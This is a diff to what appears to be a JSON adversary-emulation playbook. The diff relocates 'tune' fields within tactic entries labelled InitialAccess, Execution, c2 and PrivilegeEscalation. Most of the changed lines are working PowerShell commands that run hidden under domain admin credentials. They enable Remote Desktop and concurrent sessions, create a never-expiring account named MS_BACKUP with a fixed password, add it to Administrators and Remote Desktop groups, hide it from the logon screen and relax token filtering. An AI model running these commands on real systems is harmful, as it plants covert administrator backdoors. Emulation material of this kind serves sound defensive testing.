@@ -14,7 +14,8 @@
             "label": "actuator",
             "preconditions": {
                 "tool": "self.tool_name"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -24,7 +25,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -34,7 +36,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -46,7 +49,8 @@
                 "exfiltration": "self.exfil",
                 "driveby": "self.driveby",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -54,7 +58,8 @@
             "label": "Payload",
             "preconditions": {
                 "tool": "self.tool"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "InitialAccess",
@@ -66,7 +71,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Execution",
@@ -78,7 +84,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -90,7 +97,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "PrivilegeEscalation",
@@ -100,10 +108,10 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target_1": "self.target_1",
-                "target_2": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$password = ConvertTo-SecureString '${self.domain_admin_password}' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\${self.domain_admin_username}', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{reg add \\\"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\\" /v fDenyTSConnections /t REG_DWORD /d 0 /f}'};echo 'Done'"
-                }
+                "target_2": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$password = ConvertTo-SecureString '${self.domain_admin_password}' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\${self.domain_admin_username}', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{reg add \\\"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\\" /v fDenyTSConnections /t REG_DWORD /d 0 /f}'};echo 'Done'"
             }
         },
         {
@@ -113,10 +121,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$password = ConvertTo-SecureString '${self.domain_admin_password}' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\${self.domain_admin_username}', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{reg add \\\"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f}'};echo 'Done'"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$password = ConvertTo-SecureString '${self.domain_admin_password}' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\${self.domain_admin_username}', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{reg add \\\"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f}'};echo 'Done'"
             }
         },
         {
@@ -126,10 +134,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$password = ConvertTo-SecureString '${self.domain_admin_password}' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\${self.domain_admin_username}', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{reg add \\\"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core\\\" /v EnableConcurrentSessions /t REG_DWORD /d 1 /f}'};echo 'Done'"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$password = ConvertTo-SecureString '${self.domain_admin_password}' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\${self.domain_admin_username}', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{reg add \\\"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core\\\" /v EnableConcurrentSessions /t REG_DWORD /d 1 /f}'};echo 'Done'"
             }
         },
         {
@@ -139,10 +147,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$password = ConvertTo-SecureString '${self.domain_admin_password}' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\${self.domain_admin_username}', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{reg add \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" /v EnableConcurrentSessions /t REG_DWORD /d 1 /f}'};echo 'Done'"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$password = ConvertTo-SecureString '${self.domain_admin_password}' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\${self.domain_admin_username}', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{reg add \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" /v EnableConcurrentSessions /t REG_DWORD /d 1 /f}'};echo 'Done'"
             }
         },
         {
@@ -152,10 +160,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$password = ConvertTo-SecureString '${self.domain_admin_password}' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\${self.domain_admin_username}', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{reg add \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" /v AllowMultipleTSSessions /t REG_DWORD /d 1 /f}'};echo 'Done'"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$password = ConvertTo-SecureString '${self.domain_admin_password}' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\${self.domain_admin_username}', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{reg add \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" /v AllowMultipleTSSessions /t REG_DWORD /d 1 /f}'};echo 'Done'"
             }
         },
         {
@@ -165,10 +173,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$password = ConvertTo-SecureString '${self.domain_admin_password}' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\${self.domain_admin_username}', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{reg add \\\"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services\\\" /v MaxInstanceCount /t REG_DWORD /d 100 /f}'};echo 'Done'"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$password = ConvertTo-SecureString '${self.domain_admin_password}' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\${self.domain_admin_username}', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{reg add \\\"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services\\\" /v MaxInstanceCount /t REG_DWORD /d 100 /f}'};echo 'Done'"
             }
         },
         {
@@ -178,10 +186,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$password = ConvertTo-SecureString '${self.domain_admin_password}' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\${self.domain_admin_username}', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{net user MS_BACKUP Allanite_1 /add;net user MS_BACKUP /expires:never}'};echo 'Done'"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$password = ConvertTo-SecureString '${self.domain_admin_password}' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\${self.domain_admin_username}', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{net user MS_BACKUP Allanite_1 /add;net user MS_BACKUP /expires:never}'};echo 'Done'"
             }
         },
         {
@@ -191,10 +199,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$password = ConvertTo-SecureString '${self.domain_admin_password}' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\${self.domain_admin_username}', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{net localgroup Administrators /add MS_BACKUP;net localgroup Administradores /add MS_BACKUP;net localgroup Amministratori /add MS_BACKUP;net localgroup Administratoren /add MS_BACKUP;net localgroup Administrateurs /add MS_BACKUP;net localgroup \\\"Remote Desktop Users\\\" /add MS_BACKUP}'};echo 'Done'"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$password = ConvertTo-SecureString '${self.domain_admin_password}' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\${self.domain_admin_username}', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{net localgroup Administrators /add MS_BACKUP;net localgroup Administradores /add MS_BACKUP;net localgroup Amministratori /add MS_BACKUP;net localgroup Administratoren /add MS_BACKUP;net localgroup Administrateurs /add MS_BACKUP;net localgroup \\\"Remote Desktop Users\\\" /add MS_BACKUP}'};echo 'Done'"
             }
         },
         {
@@ -204,10 +212,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$password = ConvertTo-SecureString '${self.domain_admin_password}' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\${self.domain_admin_username}', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f}'};echo 'Done'"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$password = ConvertTo-SecureString '${self.domain_admin_password}' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\${self.domain_admin_username}', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f}'};echo 'Done'"
             }
         },
         {
@@ -217,10 +225,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$password = ConvertTo-SecureString '${self.domain_admin_password}' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\${self.domain_admin_username}', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{reg add \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\\\" /v MS_BACKUP /t REG_DWORD /d 0 /f}'};echo 'Done'"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$password = ConvertTo-SecureString '${self.domain_admin_password}' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\${self.domain_admin_username}', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{reg add \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\\\" /v MS_BACKUP /t REG_DWORD /d 0 /f}'};echo 'Done'"
             }
         },
         {
@@ -230,10 +238,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$password = ConvertTo-SecureString '${self.domain_admin_password}' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\${self.domain_admin_username}', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v dontdisplaylastusername /t REG_DWORD /d 1 /f}'};echo 'Done'"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$password = ConvertTo-SecureString '${self.domain_admin_password}' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\${self.domain_admin_username}', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v dontdisplaylastusername /t REG_DWORD /d 1 /f}'};echo 'Done'"
             }
         },
         {
@@ -244,7 +252,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         }
     ],
     "iocs": {
